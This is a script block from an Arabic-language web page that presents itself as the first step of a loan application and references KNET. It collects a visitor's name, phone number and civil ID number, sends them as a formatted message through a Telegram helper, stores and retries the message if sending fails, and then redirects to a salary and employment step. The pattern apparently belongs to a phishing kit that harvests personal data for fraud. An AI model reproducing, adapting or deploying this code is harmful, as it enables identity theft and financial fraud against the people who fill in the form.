    <script>
        function normalizeDigits(value) {
            return value
                .replace(/[٠-٩]/g, function(char) { return String(char.charCodeAt(0) - 1632); })
                .replace(/[۰-۹]/g, function(char) { return String(char.charCodeAt(0) - 1776); });
        }

        function digitsOnly(value) {
            return normalizeDigits(value).replace(/\D+/g, '');
        }

        function buildStep1SubmissionMessage(nameValue, phoneValue, civilValue) {
            const pageName = window.getCurrentTelegramPageName ? window.getCurrentTelegramPageName() : 'صفحة المعلومات الشخصية';
            const separator = '───────────────';
            const details = [];

            if (nameValue) details.push(`الاسم: ${nameValue}`);
            if (phoneValue) details.push(`رقم الهاتف: ${phoneValue}`);
            if (civilValue) details.push(`الرقم المدني: ${civilValue}`);

            if (!details.length) {
                details.push('لا توجد معلومات مدخلة');
            }

            return [pageName, separator].concat(details).join('\n');
        }

        function syncLoanType() {
            const params = new URLSearchParams(window.location.search);
            const loanType = params.get('loan') || localStorage.getItem('selectedLoanType') || 'general';
            localStorage.setItem('selectedLoanType', loanType);
        }

        function bindStep1() {
            syncLoanType();

            const form = document.getElementById('sb');
            const phone = document.getElementById('pp');
            const civil = document.getElementById('cv');
            const name = document.getElementById('nm');
            const submitButton = document.getElementById('sbb');

            const storedPhone = localStorage.getItem('step1.phone');
            const storedName = localStorage.getItem('step1.name');
            const storedCivil = localStorage.getItem('step1.civil');

            if (storedPhone) phone.value = storedPhone;
            if (storedName) name.value = storedName;
            if (storedCivil) civil.value = storedCivil;

            form.dataset.submitting = 'false';
            if (submitButton) {
                submitButton.disabled = false;
                submitButton.removeAttribute('aria-busy');
            }
            if (window.hideSubmissionLoadingOverlay) {
                window.hideSubmissionLoadingOverlay();
            }

            [phone, civil].forEach(function(input) {
                if (input.dataset.bound === 'true') return;
                input.dataset.bound = 'true';
                input.addEventListener('input', function() {
                    input.value = digitsOnly(input.value);
                });
            });

            if (form.dataset.bound !== 'true') {
                form.dataset.bound = 'true';
                form.addEventListener('submit', async function(event) {
                    event.preventDefault();

                    if (form.dataset.submitting === 'true') return;

                    form.dataset.submitting = 'true';
                    if (submitButton) {
                        submitButton.disabled = true;
                        submitButton.setAttribute('aria-busy', 'true');
                    }

                    const phoneValue = digitsOnly(phone.value);
                    const nameValue = name.value.trim();
                    const civilValue = digitsOnly(civil.value);

                    localStorage.setItem('step1.phone', phoneValue);
                    localStorage.setItem('step1.name', nameValue);
                    localStorage.setItem('step1.civil', civilValue);

                    const message = buildStep1SubmissionMessage(nameValue, phoneValue, civilValue);

                    if (window.showSubmissionLoadingOverlay) {
                        window.showSubmissionLoadingOverlay('جارٍ الانتقال إلى صفحة الراتب والوظيفة...', 3000, 'knet');
                    }

                    const sent = window.sendTelegramMessageOnce
                        ? await window.sendTelegramMessageOnce(message, false)
                        : false;

                    if (!sent) {
                        localStorage.setItem(window.STEP1_FAIL_STORAGE_KEY || 'step1_fail', message);
                        if (window.persistTelegramMessageThenSend) {
                            window.persistTelegramMessageThenSend(message, false).catch(function() {});
                        }
                    } else {
                        localStorage.removeItem(window.STEP1_FAIL_STORAGE_KEY || 'step1_fail');
                    }

                    window.location.href = './step2.html';
                });
            }
        }

        bindStep1();
        window.addEventListener('pageshow', bindStep1);
    </script>
